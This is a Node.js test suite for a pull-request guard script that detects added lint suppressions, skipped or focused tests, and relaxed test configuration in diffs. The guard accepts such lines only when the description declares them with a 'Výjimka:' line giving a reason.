import { strict as assert } from 'node:assert';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { addedSuppressions, readDeclarations, readerFor, undeclaredSuppressions } from './suppression-guard.mjs';

const SCRIPT = fileURLToPath(new URL('suppression-guard.mjs', import.meta.url));
const TEMPLATE = fileURLToPath(new URL('../.github/pull_request_template.md', import.meta.url));
const REASON = 'Mockito captor of a generic type';

function diffOf(path, added, { removed = [], status = 'modified', start = 10 } = {}) {
  const header = [`diff --git a/${path} b/${path}`];
  if (status === 'added') header.push('new file mode 100644', '--- /dev/null', `+++ b/${path}`);
  if (status === 'deleted') header.push('deleted file mode 100644', `--- a/${path}`, '+++ /dev/null');
  if (status === 'modified') header.push(`--- a/${path}`, `+++ b/${path}`);
  const hunk = `@@ -${start},${removed.length} +${start},${added.length} @@`;
  return [...header, hunk, ...removed.map((line) => `-${line}`), ...added.map((line) => `+${line}`)].join('\n');
}

const declared = (body) => readDeclarations(body).declared;
const located = (found) => found.map(({ path, line }) => [path, line]);

const PLANTED = [
  ['Java @SuppressWarnings', 'backend/src/main/java/A.java', '    @SuppressWarnings("unchecked")'],
  ['a fully qualified @SuppressWarnings', 'backend/src/main/java/A.java', '    @java.lang.SuppressWarnings("unchecked")'],
  ['Java @Disabled', 'backend/src/test/java/ATest.java', '    @Disabled("flaky")'],
  ['a fully qualified @Disabled', 'backend/src/test/java/ATest.java', '    @org.junit.jupiter.api.Disabled'],
  ['Java @DisabledIf', 'backend/src/test/java/ATest.java', '    @DisabledIfEnvironmentVariable(named = "CI", matches = "true")'],
  ['Java @EnabledIf', 'backend/src/test/java/ATest.java', '    @EnabledIfSystemProperty(named = "slow", matches = "true")'],
  ['Java @EnabledOnOs', 'backend/src/test/java/ATest.java', '    @EnabledOnOs(OS.LINUX)'],
  ['ArchUnit @ArchIgnore', 'backend/src/test/java/RulesTest.java', '    @ArchIgnore'],
  ['ArchUnit allowEmptyShould', 'backend/src/test/java/RulesTest.java', '        .allowEmptyShould(true)'],
  ['ArchUnit FreezingArchRule', 'backend/src/test/java/RulesTest.java', '    static final ArchRule RULE = FreezingArchRule.freeze(rule);'],
  ['ArchUnit ArchConfiguration', 'backend/src/test/java/RulesTest.java', '        ArchConfiguration.get().setFailOnEmptyShould(false);'],
  ['JUnit assumeTrue', 'backend/src/test/java/ATest.java', '        assumeTrue(System.getenv("CI") == null);'],
  ['JUnit assumeFalse', 'backend/src/test/java/ATest.java', '        Assumptions.assumeFalse(onCi);'],
  ['AssertJ assumeThat', 'backend/src/test/java/ATest.java', '        assumeThat(docker).isTrue();'],
  ['Assumptions.abort', 'backend/src/test/java/ATest.java', '        Assumptions.abort("later");'],
  ['Kotlin @Suppress', 'backend/build.gradle.kts', '@Suppress("UnstableApiUsage")'],
  ['Kotlin @file:Suppress', 'backend/src/main/kotlin/A.kt', '@file:Suppress("unused")'],
  ['eslint-disable', 'frontend/src/app/a.ts', '// eslint-disable-next-line @typescript-eslint/no-explicit-any'],
  ['eslint-disable in a template', 'frontend/src/app/a.html', '<!-- eslint-disable -->'],
  ['eslint-disable in an .mts file', 'frontend/vitest.config.mts', '// eslint-disable-next-line'],
  ['@ts-ignore', 'frontend/src/app/a.ts', '  // @ts-ignore'],
  ['@ts-expect-error', 'mcp/src/a.ts', '  // @ts-expect-error'],
  ['@ts-expect-error in a .cts file', 'mcp/src/a.cts', '  // @ts-expect-error'],
  ['@ts-nocheck', 'scripts/a.mjs', '// @ts-nocheck'],
  ['stylelint-disable', 'frontend/src/app/a.scss', '  /* stylelint-disable-next-line */'],
  ['prettier-ignore', 'frontend/src/app/a.html', '<!-- prettier-ignore -->'],
  ['it.skip', 'frontend/src/app/a.spec.ts', "  it.skip('when …, then …', () => {"],
  ['it.skip in an .mts file', 'mcp/test/a.spec.mts', "  it.skip('when …, then …', () => {"],
  ['describe.skip', 'mcp/test/a.spec.ts', "describe.skip('Given …', () => {"],
  ['test.describe.skip', 'frontend/e2e/a.spec.ts', "test.describe.skip('Given …', () => {"],
  ['xit', 'frontend/src/app/a.spec.ts', "  xit('when …, then …', () => {"],
  ['xdescribe', 'frontend/src/app/a.spec.ts', "xdescribe('Given …', () => {"],
  ['it.only', 'frontend/src/app/a.spec.ts', "  it.only('when …, then …', () => {"],
  ['describe.only', 'mcp/test/a.spec.ts', "describe.only('Given …', () => {"],
  ['test.only', 'frontend/e2e/a.spec.ts', "test.only('when …, then …', async () => {"],
  ['test.describe.only', 'frontend/e2e/a.spec.ts', "test.describe.only('Given …', () => {"],
  ['test.fixme', 'frontend/e2e/a.spec.ts', "test.fixme('when …, then …', async () => {"],
  ['a conditional test.fixme', 'frontend/e2e/a.spec.ts', "  test.fixme(({ browserName }) => browserName === 'webkit', 'later');"],
  ['test.skip of a named test', 'frontend/e2e/a.spec.ts', "test.skip('when …, then …', async () => {"],
  ['test.skip of a template-named test', 'frontend/e2e/a.spec.ts', 'test.skip(`when ${x}, then …`, async () => {'],
  ['a bare test.skip()', 'frontend/e2e/a.spec.ts', '  test.skip();'],
  ['test.skip(true, …)', 'frontend/e2e/a.spec.ts', "  test.skip(true, 'not now');"],
  ['test.skip with a constant condition', 'frontend/e2e/a.spec.ts', "  test.skip(1 === 1, 'not now');"],
  ['a bare test.fail()', 'frontend/e2e/a.spec.ts', '  test.fail();'],
  ['test.fail(true, …)', 'frontend/e2e/a.spec.ts', "  test.fail(true, 'known');"],
  ['test.fail of a named test', 'frontend/e2e/a.spec.ts', "test.fail('when …, then …', async () => {"],
  ['skipIf(true)', 'frontend/src/app/a.spec.ts', "  it.skipIf(true)('when …, then …', () => {"],
  ['a bare skipIf()', 'mcp/test/a.spec.ts', "  describe.skipIf()('Given …', () => {"],
  ['pwaTest.skip of a named test', 'frontend/e2e/pwa/a.spec.ts', "pwaTest.skip('when …, then …', async () => {"],
  ['pwaTest.only', 'frontend/e2e/pwa/a.spec.ts', "pwaTest.only('when …, then …', async () => {"],
  ['pwaTest.fixme', 'frontend/e2e/pwa/a.spec.ts', "pwaTest.fixme('when …, then …', async () => {"],
  ['pwaTest.fail(true, …)', 'frontend/e2e/pwa/a.spec.ts', "  pwaTest.fail(true, 'known');"],
  ['pwaTest.describe.skip', 'frontend/e2e/pwa/a.spec.ts', "pwaTest.describe.skip('Given …', () => {"],
  ['pwaTest.describe.only', 'frontend/e2e/pwa/a.spec.ts', "pwaTest.describe.only('Given …', () => {"],
  ['runIf(false)', 'frontend/src/app/a.spec.ts', "  it.runIf(false)('when …, then …', () => {"],
  ['runIf(0)', 'mcp/test/a.spec.ts', "  describe.runIf(0)('Given …', () => {"],
  ['runIf(!1)', 'frontend/src/app/a.spec.ts', "  it.runIf(!1)('when …, then …', () => {"],
  ['runIf(!true)', 'frontend/src/app/a.spec.ts', "  test.runIf(!true)('when …, then …', () => {"],
  ['test.skip(() => true, …)', 'frontend/e2e/a.spec.ts', "  test.skip(() => true, 'not now');"],
  ['test.skip(!!1, …)', 'frontend/e2e/a.spec.ts', "  test.skip(!!1, 'not now');"],
  ['an arrow that returns a constant', 'frontend/e2e/a.spec.ts', "  test.fail(({ browserName }) => true, 'known');"],
  ['it.skip.each', 'frontend/src/app/a.spec.ts', "  it.skip.each([1, 2])('when %s, then …', (n) => {"],
  ['describe.only.each', 'mcp/test/a.spec.ts', "describe.only.each([1, 2])('Given %s', (n) => {"],
  ['test.skip.each', 'frontend/e2e/a.spec.ts', "test.skip.each([1, 2])('when %s, then …', async (n) => {"],
  ['a bare it.skip reference', 'frontend/src/app/a.spec.ts', 'const maybe = onCi ? it : it.skip;'],
  ['a bare test.only reference', 'frontend/e2e/a.spec.ts', 'const focused = test.only;'],
  ["it['skip']", 'frontend/src/app/a.spec.ts', "  it['skip']('when …, then …', () => {"],
  ['describe["only"]', 'mcp/test/a.spec.ts', 'describe["only"]("Given …", () => {'],
  ['a commented-out it(', 'frontend/src/app/a.spec.ts', "  // it('when …, then …', () => {"],
  ['a commented-out test(', 'frontend/e2e/a.spec.ts', "  /* test('when …, then …', async () => { */"],
  ['a commented-out describe(', 'mcp/test/a.spec.ts', "// describe('Given …', () => {"],
  ['a commented-out @Test', 'backend/src/test/java/ATest.java', '    // @Test'],
  ['a commented-out scenario', 'backend/src/test/resources/features/donors/a.feature', '  # Scenario: A donor signs in'],
  ['a Vitest context skip', 'frontend/src/app/a.spec.ts', '  it(\'when …, then …\', (ctx) => { ctx.skip(); });'],
  ['a Vitest context skip with a note', 'mcp/test/a.spec.ts', '    context.skip("later");'],
  ['a destructured Vitest skip', 'frontend/src/app/a.spec.ts', '  it(\'when …, then …\', ({ skip }) => { skip(); });'],
  ['it.todo', 'frontend/src/app/a.spec.ts', "  it.todo('when …, then …');"],
  ['test.todo', 'mcp/test/a.spec.ts', "  test.todo('when …, then …');"],
  ['a Cucumber @wip tag', 'backend/src/test/resources/features/donors/a.feature', '@donors @wip'],
  ['a Cucumber @ignore tag', 'backend/src/test/resources/features/donors/a.feature', '  @ignore'],
];

describe('Given an added line with a suppression or a skipped test', () => {
  for (const [kind, path, line] of PLANTED) {
    it(`when it is ${kind} and the description declares nothing, then it is undeclared`, () => {
      const found = addedSuppressions(diffOf(path, [line]));
      assert.equal(found.length, 1, `expected one finding for ${kind}, got ${JSON.stringify(found)}`);
      assert.deepEqual(located(undeclaredSuppressions(found, declared(''))), [[path, 10]]);
    });
  }
});

const CONFIG_PLANTED = [
  ['Playwright failOnFlakyTests', 'frontend/playwright.config.ts', '  failOnFlakyTests: false,'],
  ['Playwright forbidOnly', 'frontend/playwright.config.ts', '  forbidOnly: false,'],
  ['Playwright testIgnore', 'frontend/playwright.config.ts', "          testIgnore: /slow\\//,"],
  ['Playwright grepInvert', 'frontend/playwright.config.ts', '  grepInvert: /@slow/,'],
  ['Vitest exclude', 'frontend/vitest.config.mts', "    exclude: ['src/app/slow.spec.ts'],"],
  ['Vitest allowOnly', 'mcp/vitest.config.ts', '    allowOnly: true,'],
  ['Gradle excludeTestsMatching', 'backend/build.gradle.kts', '\t\texcludeTestsMatching("*SlowTest")'],
  ['Gradle excludeTags', 'backend/build.gradle.kts', '\t\texcludeTags("slow")'],
  ['Gradle excludeEngines', 'backend/build.gradle.kts', '\t\texcludeEngines("archunit")'],
  ['Gradle ignoreFailures', 'backend/build.gradle.kts', '\tignoreFailures = true'],
  ['Gradle isFailOnNoMatchingTests', 'backend/build.gradle.kts', '\t\tisFailOnNoMatchingTests = false'],
  ['Gradle enabled =', 'backend/build.gradle.kts', '\tenabled = false'],
  ['a Cucumber suite @ExcludeTags', 'backend/src/test/java/cz/novanadeje/app/cucumber/DonorsAcceptanceTests.java', '@ExcludeTags("slow")'],
  ['a Cucumber suite FILTER_TAGS', 'backend/src/test/java/cz/novanadeje/app/cucumber/DonorsAcceptanceTests.java', '@ConfigurationParameter(key = FILTER_TAGS_PROPERTY_NAME, value = "not @slow")'],
  ['an ESLint rule off', 'frontend/eslint.config.js', "      '@typescript-eslint/no-explicit-any': 'off',"],
  ['an ESLint rule 0', 'frontend/eslint.config.js', "      'no-console': 0,"],
  ['an ESLint rule off in an array', 'frontend/eslint.config.js', "      'max-len': ['off', 100],"],
  ['new ESLint ignores', 'frontend/eslint.config.js', "  { ignores: ['src/legacy/**'] },"],
  ['a Stylelint rule off', 'frontend/.stylelintrc.json', '    "color-no-hex": null,'],
  ['new Stylelint ignoreFiles', 'frontend/.stylelintrc.json', '  "ignoreFiles": ["src/legacy/**"],'],
  ['tsconfig strict false', 'frontend/tsconfig.json', '    "strict": false,'],
  ['tsconfig strictTemplates false', 'frontend/tsconfig.json', '    "strictTemplates": false,'],
  ['a .prettierignore line', 'frontend/.prettierignore', 'src/legacy/'],
  ['an archunit_ignore_patterns.txt line', 'backend/src/test/resources/archunit_ignore_patterns.txt', '.*SlowRule.*'],
  ['a .gitattributes line', '.gitattributes', '*.spec.ts -diff'],
  ['a gradle.properties noCucumber', 'backend/gradle.properties', 'noCucumber=true'],
  ['JUnit conditions deactivated in properties', 'backend/src/test/resources/junit-platform.properties', 'junit.jupiter.conditions.deactivate=*'],
  ['JUnit extension autodetection in properties', 'backend/src/test/resources/junit-platform.properties', 'junit.jupiter.extensions.autodetection.enabled=true'],
  ['Vitest passWithNoTests', 'frontend/vitest.config.mts', '    passWithNoTests: true,'],
  ['a Cucumber tag filter in properties', 'backend/src/test/resources/junit-platform.properties', 'cucumber.filter.tags=not @slow'],
  ['a Cucumber features selection in properties', 'backend/src/test/resources/junit-platform.properties', 'cucumber.features=src/test/resources/features/donors'],
  ['an angular.json include', 'frontend/angular.json', '              "include": ["src/app/fast/**/*.spec.ts"],'],
  ['Playwright grep', 'frontend/playwright.config.ts', '  grep: /@fast/,'],
  ['Playwright testMatch', 'frontend/playwright.config.ts', "          testMatch: /fast\\/.*\\.spec\\.ts$/,"],
  ['Playwright testDir', 'frontend/playwright.config.ts', "  testDir: './e2e/fast',"],
  ['Gradle exclude', 'backend/build.gradle.kts', '\t\texclude("**/SlowTest*")'],
  ['Gradle include', 'backend/build.gradle.kts', '\t\tinclude("**/FastTest*")'],
  ['Gradle includeTestsMatching', 'backend/build.gradle.kts', '\t\tincludeTestsMatching("*FastTest")'],
  ['Gradle includeTags', 'backend/build.gradle.kts', '\t\tincludeTags("fast")'],
  ['Gradle onlyIf', 'backend/build.gradle.kts', '\tonlyIf { false }'],
  ['Gradle isEnabled', 'backend/build.gradle.kts', '\tisEnabled = false'],
  ['a suite @IncludeTags', 'backend/src/test/java/cz/novanadeje/app/cucumber/DonorsAcceptanceTests.java', '@IncludeTags("fast")'],
  ['a suite @SelectClasspathResource', 'backend/src/test/java/cz/novanadeje/app/cucumber/DonorsAcceptanceTests.java', '@SelectClasspathResource("features/donors/sign_in.feature")'],
  ['a suite @ExcludeClassNamePatterns', 'backend/src/test/java/cz/novanadeje/app/cucumber/DonorsAcceptanceTests.java', '@ExcludeClassNamePatterns(".*Slow.*")'],
  ['a suite @IncludeClassNamePatterns', 'backend/src/test/java/cz/novanadeje/app/cucumber/DonorsAcceptanceTests.java', '@IncludeClassNamePatterns(".*Fast.*")'],
  ['ArchUnit ignoreDependency', 'backend/src/test/java/RulesTest.java', '        .ignoreDependency(Foo.class, Bar.class)'],
  ['ArchUnit importOptions', 'backend/src/test/java/RulesTest.java', '        importOptions = { ImportOption.DoNotIncludeTests.class, NoSlowClasses.class }'],
  ['ArchUnit withOptionalLayers', 'backend/src/test/java/RulesTest.java', '        .withOptionalLayers(true)'],
  ['a static abort', 'backend/src/test/java/ATest.java', '        abort("later");'],
  ['JUnit assumingThat', 'backend/src/test/java/ATest.java', '        assumingThat(onCi, () -> check());'],
  ['tsconfig noImplicitAny false', 'frontend/tsconfig.json', '    "noImplicitAny": false,'],
  ['tsconfig noUnusedLocals false', 'mcp/tsconfig.json', '    "noUnusedLocals": false,'],
  ['tsconfig skipLibCheck true', 'frontend/tsconfig.json', '    "skipLibCheck": true,'],
  ['a package.json --grep-invert', 'frontend/package.json', '    "e2e": "playwright test --grep-invert @slow",'],
  ['a package.json --exclude', 'mcp/package.json', '    "test": "vitest run --exclude test/slow.spec.ts",'],
  ['a package.json --passWithNoTests', 'mcp/package.json', '    "test": "vitest run --passWithNoTests",'],
  ['a package.json --pass-with-no-tests', 'frontend/package.json', '    "test": "ng test --pass-with-no-tests",'],
  ['an angular.json exclude', 'frontend/angular.json', '              "exclude": ["src/app/slow/**"],'],
  ['a package.json || true', 'frontend/package.json', '    "e2e": "playwright test || true",'],
  ['a package.json || exit 0', 'mcp/package.json', '    "test": "vitest run || exit 0",'],
  ['an ESLint rule warn', 'frontend/eslint.config.js', "      'no-console': 'warn',"],
  ['an ESLint rule "warn"', 'frontend/eslint.config.js', '      "no-console": "warn",'],
  ['an ESLint rule 1', 'frontend/eslint.config.js', "      'no-console': 1,"],
  ['an ESLint rule warn in an array', 'frontend/eslint.config.js', "      'max-len': ['warn', 100],"],
  ['a Stylelint defaultSeverity', 'frontend/.stylelintrc.json', '  "defaultSeverity": "warning",'],
  ['a Stylelint rule severity', 'frontend/.stylelintrc.json', '    "color-no-hex": [true, { "severity": "warning" }],'],
  ['Gradle setIncludes', 'backend/build.gradle.kts', '\t\tsetIncludes(listOf("**/FastTest*"))'],
  ['Gradle setExcludes', 'backend/build.gradle.kts', '\t\tsetExcludes(listOf("**/SlowTest*"))'],
  ['Gradle includeEngines', 'backend/build.gradle.kts', '\t\tincludeEngines("junit-jupiter")'],
  ['Gradle StopExecutionException', 'backend/build.gradle.kts', '\tdoFirst { throw StopExecutionException() }'],
  ['Gradle actions.clear()', 'backend/build.gradle.kts', '\ttasks.named("test") { actions.clear() }'],
  ['a Gradle dry run', 'backend/build.gradle.kts', '\tsystemProperty("junit.platform.execution.dryRun.enabled", "true")'],
  ['a Gradle --dry-run argument', 'backend/build.gradle.kts', '\targs("--dry-run")'],
  ['a JUnit dry run in properties', 'backend/src/test/resources/junit-platform.properties', 'junit.platform.execution.dryRun.enabled=true'],
  ['a Cucumber dry run in properties', 'backend/src/test/resources/junit-platform.properties', 'cucumber.execution.dry-run=true'],
  ['a Cucumber glue in properties', 'backend/src/test/resources/junit-platform.properties', 'cucumber.glue=cz.novanadeje.app.nothing'],
  ['a suite @ConfigurationParameter', 'backend/src/test/java/cz/novanadeje/app/cucumber/DonorsAcceptanceTests.java', '@ConfigurationParameter(key = "cucumber.execution.dry-run", value = "true")'],
  ['a unicode escape in a package.json', 'frontend/package.json', '  "\\u0073cripts": { "lint": "true" },'],
  ['a known device finding', 'frontend/e2e/devices/known-findings.ts', "  { pose: 'iphone-se', steps: ['home'], check: 'covered', text: 'Přispět', why: 'later' },"],
];

describe('Given an added line that relaxes a check in its configuration', () => {
  for (const [kind, path, line] of CONFIG_PLANTED) {
    it(`when it is ${kind}, then it is undeclared`, () => {
      const found = addedSuppressions(diffOf(path, [line]));
      assert.equal(found.length, 1, `expected one finding for ${kind}, got ${JSON.stringify(found)}`);
      assert.deepEqual(located(undeclaredSuppressions(found, declared(''))), [[path, 10]]);
    });
  }

  it('when the line only moves within its file, then it still counts', () => {
    const line = '  failOnFlakyTests: !!process.env.CI,';
    const diff = diffOf('frontend/playwright.config.ts', [`  ${line}`], { removed: [line] });
    assert.deepEqual(
      addedSuppressions(diff).map(({ kind }) => kind),
      ['failOnFlakyTests', 'removed failOnFlakyTests'],
    );
  });

  it('when a removed setting is added back twice, then each added line counts', () => {
    const line = "  testIgnore: /pwa\\//,";
    const diff = diffOf('frontend/playwright.config.ts', [line, line], { removed: [line] });
    assert.equal(addedSuppressions(diff).length, 2);
  });

  it('when the same words stand in a file of another kind, then nothing is found', () => {
    const lines = [
      "const exclude = ['a'];",
      'const enabled = false;',
      "const rules = { 'x': 'off' };",
      'const forbidOnly = true;',
    ];
    assert.deepEqual(addedSuppressions(diffOf('frontend/src/app/a.ts', lines)), []);
  });

  it('when a .prettierignore or archunit.properties only loses lines, then nothing is found', () => {
    for (const path of ['frontend/.prettierignore', 'backend/src/test/resources/archunit.properties']) {
      assert.deepEqual(addedSuppressions(diffOf(path, [], { removed: ['src/legacy/'] })), [], path);
    }
  });
});

describe('Given an archunit.properties in the change', () => {
  const path = 'backend/src/test/resources/archunit.properties';

  it('when it is added, then it is a suppression', () => {
    const found = addedSuppressions(diffOf(path, ['archRule.failOnEmptyShould=false'], { status: 'added', start: 1 }));
    assert.deepEqual(
      found.map(({ path: file, kind }) => [file, kind]),
      [[path, 'archunit.properties']],
    );
  });

  it('when it is changed, then it is a suppression', () => {
    assert.equal(addedSuppressions(diffOf(path, ['freeze.store.default.allowStoreCreation=true'])).length, 1);
  });

  it('when it is deleted, then nothing is suppressed', () => {
    assert.deepEqual(addedSuppressions(diffOf(path, [], { status: 'deleted', removed: ['a=b'] })), []);
  });

  it('when it is moved into place unchanged, then it is a suppression', () => {
    const diff = [
      `diff --git a/archunit.properties b/${path}`,
      'similarity index 100%',
      'rename from archunit.properties',
      `rename to ${path}`,
    ].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [[path, 1]]);
  });
});

describe('Given added lines that look like diff headers', () => {
  it('when an added line starts with "++ ", then it neither renames the file nor hides the next finding', () => {
    const diff = diffOf('frontend/src/app/a.ts', ['++ b/frontend/src/app/other.md', '// eslint-disable-next-line']);
    assert.deepEqual(located(addedSuppressions(diff)), [['frontend/src/app/a.ts', 11]]);
  });

  it('when a removed line starts with "-- ", then the findings keep their file', () => {
    const diff = diffOf('frontend/src/app/a.ts', ['// @ts-ignore'], { removed: ['-- a/elsewhere.md'] });
    assert.deepEqual(located(addedSuppressions(diff)), [['frontend/src/app/a.ts', 10]]);
  });
});

describe('Given paths git writes quoted or with a trailing tab', () => {
  it('when the path has a space, then the tab after it is not part of the path', () => {
    const path = 'frontend/src/app/my file.ts';
    const diff = [`diff --git a/${path} b/${path}`, `--- a/${path}\t`, `+++ b/${path}\t`, '@@ -1,0 +1,1 @@', '+// @ts-ignore'].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [[path, 1]]);
  });

  it('when git quotes and escapes the path, then it is read back to its characters', () => {
    const diff = [
      'diff --git "a/frontend/src/app/\\303\\241\\"b.ts" "b/frontend/src/app/\\303\\241\\"b.ts"',
      '--- "a/frontend/src/app/\\303\\241\\"b.ts"',
      '+++ "b/frontend/src/app/\\303\\241\\"b.ts"',
      '@@ -1,0 +1,1 @@',
      '+// @ts-ignore',
    ].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['frontend/src/app/á"b.ts', 1]]);
  });
});

describe('Given a change git reports as a move', () => {
  it('when a file with a suppression moves unchanged, then nothing is found', () => {
    const diff = [
      'diff --git a/backend/src/test/java/a/ATest.java b/backend/src/test/java/b/ATest.java',
      'similarity index 100%',
      'rename from backend/src/test/java/a/ATest.java',
      'rename to backend/src/test/java/b/ATest.java',
    ].join('\n');
    assert.deepEqual(addedSuppressions(diff), []);
  });

  it('when it moves and gains a suppression, then only the added line is found', () => {
    const diff = [
      'diff --git a/backend/src/test/java/a/ATest.java b/backend/src/test/java/b/ATest.java',
      'similarity index 90%',
      'rename from backend/src/test/java/a/ATest.java',
      'rename to backend/src/test/java/b/ATest.java',
      'index 1111111..2222222 100644',
      '--- a/backend/src/test/java/a/ATest.java',
      '+++ b/backend/src/test/java/b/ATest.java',
      '@@ -20,0 +21,1 @@',
      '+    @Disabled',
    ].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['backend/src/test/java/b/ATest.java', 21]]);
  });
});

describe('Given a diff of a real repository', () => {
  const folders = [];
  afterEach(() => folders.splice(0).forEach((folder) => rmSync(folder, { recursive: true, force: true })));

  it('when files with spaces, accents and a "++" line change and one moves, then each finding names its file and line', () => {
    const root = mkdtempSync(join(tmpdir(), 'suppression-guard-git-'));
    folders.push(root);
    const git = (...args) => {
      const result = spawnSync('git', ['-c', 'user.name=guard', '-c', 'user.email=guard@example.cz', ...args], { cwd: root, encoding: 'utf8' });
      assert.equal(result.status, 0, result.stderr);
      return result.stdout;
    };
    const write = (path, text) => {
      mkdirSync(dirname(join(root, path)), { recursive: true });
      writeFileSync(join(root, path), text);
    };
    git('init', '-q');
    write('src/moved/ATest.java', '@SuppressWarnings("unchecked")\nclass ATest {}\n');
    write('src/my file.ts', 'const a = 1;\n');
    write('src/přehled.ts', 'const b = 1;\n');
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
    git('mv', 'src/moved/ATest.java', 'src/ATest.java');
    write('src/my file.ts', 'const a = 1;\n++ b/src/other.md\n// @ts-ignore\n');
    write('src/přehled.ts', 'const b = 1;\n// eslint-disable-next-line\n');
    git('add', '-A');
    git('commit', '-q', '-m', 'change');
    const diff = git('-c', 'core.quotePath=false', 'diff', '--unified=0', 'HEAD^1', 'HEAD');
    assert.deepEqual(located(addedSuppressions(diff)), [
      ['src/my file.ts', 3],
      ['src/přehled.ts', 2],
    ]);
  });
});

describe('Given a suppression the description declares', () => {
  const found = addedSuppressions(diffOf('backend/src/test/java/ATest.java', ['    @SuppressWarnings("unchecked")']));

  it('when a "Výjimka:" line names its file with a reason, then nothing is undeclared', () => {
    const body = `Co se mění\n\nVýjimka: backend/src/test/java/ATest.java: ${REASON}\r\nVzhled: beze změny`;
    assert.deepEqual(undeclaredSuppressions(found, declared(body)), []);
  });

  it('when the path is in backticks, then it is declared too', () => {
    const body = `- Výjimka: \`backend/src/test/java/ATest.java\`: ${REASON}`;
    assert.deepEqual(undeclaredSuppressions(found, declared(body)), []);
  });

  it('when a path with a space is in backticks, then it is declared', () => {
    const spaced = addedSuppressions(diffOf('frontend/src/app/my file.ts', ['// @ts-ignore']));
    assert.deepEqual(undeclaredSuppressions(spaced, declared(`Výjimka: \`frontend/src/app/my file.ts\`: ${REASON}`)), []);
  });

  it('when the line names another file, then the suppression stays undeclared', () => {
    const body = `Výjimka: backend/src/test/java/BTest.java: ${REASON}`;
    assert.equal(undeclaredSuppressions(found, declared(body)).length, 1);
  });

  it('when the line stands mid-sentence, then it does not count', () => {
    const body = `Write Výjimka: backend/src/test/java/ATest.java: ${REASON}`;
    assert.equal(undeclaredSuppressions(found, declared(body)).length, 1);
  });

  it('when a reason mentions a generic type, then it still counts', () => {
    const body = 'Výjimka: backend/src/test/java/ATest.java: captor of List<Payment> in Mockito';
    assert.deepEqual(undeclaredSuppressions(found, declared(body)), []);
  });
});

describe('Given a "Výjimka:" line without a real reason', () => {
  const found = addedSuppressions(diffOf('backend/src/test/java/ATest.java', ['    @SuppressWarnings("unchecked")']));
  const REFUSED = [
    ['no reason after the colon', 'Výjimka: backend/src/test/java/ATest.java:'],
    ['no colon after the path', 'Výjimka: backend/src/test/java/ATest.java'],
    ['the placeholder of the guard', 'Výjimka: backend/src/test/java/ATest.java: <důvod>'],
    ['an English placeholder', 'Výjimka: backend/src/test/java/ATest.java: <reason>'],
    ['a placeholder with a word', 'Výjimka: backend/src/test/java/ATest.java: <reason> ok'],
    ['a reason shorter than ten characters', 'Výjimka: backend/src/test/java/ATest.java: needed'],
  ];
  for (const [what, body] of REFUSED) {
    it(`when it has ${what}, then the suppression stays undeclared and the line is reported`, () => {
      const { declared: accepted, rejected } = readDeclarations(body);
      assert.equal(undeclaredSuppressions(found, accepted).length, 1);
      assert.deepEqual(
        rejected.map(({ path }) => path),
        ['backend/src/test/java/ATest.java'],
      );
    });
  }
});

describe('Given a "Výjimka:" line the description does not show', () => {
  const found = addedSuppressions(diffOf('backend/src/test/java/ATest.java', ['    @SuppressWarnings("unchecked")']));
  const HIDDEN = [
    ['inside an HTML comment', `<!-- Výjimka: backend/src/test/java/ATest.java: ${REASON} -->`],
    ['inside a comment over several lines', `<!--\nVýjimka: backend/src/test/java/ATest.java: ${REASON}\n-->`],
    ['inside an unclosed comment', `<!--\nVýjimka: backend/src/test/java/ATest.java: ${REASON}`],
    ['inside a fenced code block', `\`\`\`\nVýjimka: backend/src/test/java/ATest.java: ${REASON}\n\`\`\``],
    ['inside a tilde fence', `~~~text\nVýjimka: backend/src/test/java/ATest.java: ${REASON}\n~~~`],
  ];
  for (const [where, body] of HIDDEN) {
    it(`when it stands ${where}, then it does not count`, () => {
      assert.equal(undeclaredSuppressions(found, declared(body)).length, 1);
    });
  }

  it('when the pull request template is left as it is, then it declares and rejects nothing', () => {
    const { declared: accepted, rejected } = readDeclarations(readFileSync(TEMPLATE, 'utf8'));
    assert.deepEqual([[...accepted], rejected], [[], []]);
  });
});

describe('Given the forms the rules allow', () => {
  const ALLOWED = [
    ['a WebKit skip with its reason', 'frontend/e2e/a.spec.ts', [
      '  test.skip(',
      "    ({ browserName }) => browserName !== 'chromium',",
      "    'Only Chromium grants the clipboard permissions; the device checklist copies on the iPhone',",
      '  );',
    ]],
    ['a one-line conditional skip', 'frontend/e2e/a.spec.ts', ["  test.skip(!process.env['BULK_RECEIPTS_LOAD'], 'the nightly measurement');"]],
    ['test.fail of a known break', 'frontend/e2e/devices/run-step.ts', ['  test.fail(!!broken, `${broken?.reason}: remove it`);']],
    ['a triple-slash reference', 'frontend/src/a.ts', ['/// <reference types="vitest/globals" />']],
    ['a Java stream skip', 'backend/src/main/java/A.java', ['        return rows.stream().skip(1).toList();']],
    ['a fake that fails', 'backend/src/test/java/ATest.java', ['        fio.fail(refusal);']],
    ['a feature with context tags', 'backend/src/test/resources/features/donors/a.feature', ['@donors @connected-apps']],
    ['a rule quoted in Markdown', 'docs/system-overview.md', ['never `allowEmptyShould`, `eslint-disable` or `it.skip(`']],
    ['a Vitest conditional skip', 'frontend/src/app/a.spec.ts', ["  it.skipIf(!globalThis.crypto)('when …, then …', () => {"]],
    ['a Vitest conditional run', 'frontend/src/app/a.spec.ts', ["  it.runIf(globalThis.crypto)('when …, then …', () => {"]],
    ['a conditional pwaTest.skip', 'frontend/e2e/pwa/a.spec.ts', ["  pwaTest.skip(({ browserName }) => browserName !== 'chromium', 'the camera needs Chromium');"]],
    ['the standard ArchUnit import options', 'backend/src/test/java/RulesTest.java', ['        importOptions = ImportOption.DoNotIncludeTests.class']],
    ['a word that ends in test', 'frontend/src/app/a.ts', ['const newest = latest.fail(reason);']],
    ['a Vitest context skip on a condition', 'frontend/src/app/a.spec.ts', ['    ctx.skip(!globalThis.crypto, \'needs Web Crypto\');']],
    ['a skip of a stream outside a test file', 'frontend/src/app/rows.ts', ['  return rows.pipe(skip(1));']],
  ];
  for (const [form, path, lines] of ALLOWED) {
    it(`when ${form} is added, then nothing is found`, () => {
      assert.deepEqual(addedSuppressions(diffOf(path, lines)), []);
    });
  }

